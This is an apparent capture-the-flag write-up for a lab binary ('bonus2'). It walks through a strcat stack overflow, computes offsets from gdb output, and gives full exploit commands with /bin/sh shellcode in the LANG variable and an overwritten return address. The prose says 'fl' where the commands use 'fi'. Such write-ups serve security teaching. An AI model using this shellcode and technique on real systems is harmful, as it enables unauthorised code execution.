Behavior of the program : 

This program look at the env variable LANG. According to its first two characters, it will change a global variable called language.

It will then call the function greetuser, which will change the value of a greetmessage variable according to the language variable value.

it will then store this value in a buffer, and concatenate this buffer using strcat with both arguments and print it.

---

In this exploit, the goal is to override the eip of the greetuser function to replace it with the address of the shellcode using the vulnerability in the strcat function.

The shellcode will be stored in the LANG environment variable. 

---

In the frame of the greetuser function, eip is at : 0xbffff67c

and the buffer used by strcat according to this assembly code : 

   0x0804850a <+134>:	lea    0x8(%ebp),%eax
   0x0804850d <+137>:	mov    %eax,0x4(%esp)
   0x08048511 <+141>:	lea    -0x48(%ebp),%eax
   0x08048514 <+144>:	mov    %eax,(%esp)
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>

located at -0x48($ebp).

inside greetuser, ebp is at 0xbffff678.

So strcat buffer is at : 
0xbffff678 - 0x48 = 0xbffff630

Hence the padding required to overwrite greetuser's eip is : 0xbffff67c - 0xbffff630 = 0x4c = 76.

---

The thing is, by maxing the user controlled buffer in the default language, we can only reach up to 72. 

However, by changing the LANG variable to fl, the greet message changes and allows us to reach greetuser's eip. 

---

Hence we need to craft a LANG env variable so it can begin with fl, to change the greet message, it must also include the shellcode, with a long NOP prefix to facilitate the accessibility of our shellcode.

```
export LANG=$(python -c "print 'fi' + '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'")

```

---

We now need to compute the padding required to offset from strcat buffer to greetuser eip, 

if the language is fl, the greetmessage would be "Hyvää päivää ", the "ä" character is encoded on two byte so this message is : 18 bytes.

The first buffer is limited to 40 char, and the second one limited to 36 (including the 4 bytes for the address) char and our goal is at 80 (76 + 4 bytes of eip address to overwrite).

Hence the padding for the second arg is : 

Dest - greetmessage - first arg - address length = padding for second arg
80 - 18 - 40 - 4 = 18 bytes.

---

Finally, we need to find the address of the LANG env variable, this will be the address we will overwrite greetuser's eip with.

Looking at this assembly code : 

   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
   0x080485ab <+130>:	mov    %eax,0x9c(%esp)
   0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)

We can see that the return value of getenv("LANG") is stored at %esp + 0x9c.

By inspecting eax right after the getenv call : 

    Breakpoint 1, 0x080485ab in main ()
    (gdb) x $eax
    0xbffffebf:	0x90906966


we can see that this environment variable is stored at 0xbffffebf. But we want to skip the 'fi' and go anywhere in the NOP padding to eventually land on our shellcode. 0xbffffef1 seems great.

Hence the args of our program are : 

```
python -c "print 'a' * 40 + ' ' + 'b' * 18 + '\xf1\xfe\xff\xbf'"

```

Making the full exploit the combination of these two commands : 

``` 

export LANG=$(python -c "print 'fi' + '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'")

./bonus2 $(python -c "print 'a' * 40 + ' ' + 'b' * 18 + '\xf1\xfe\xff\xbf'")

```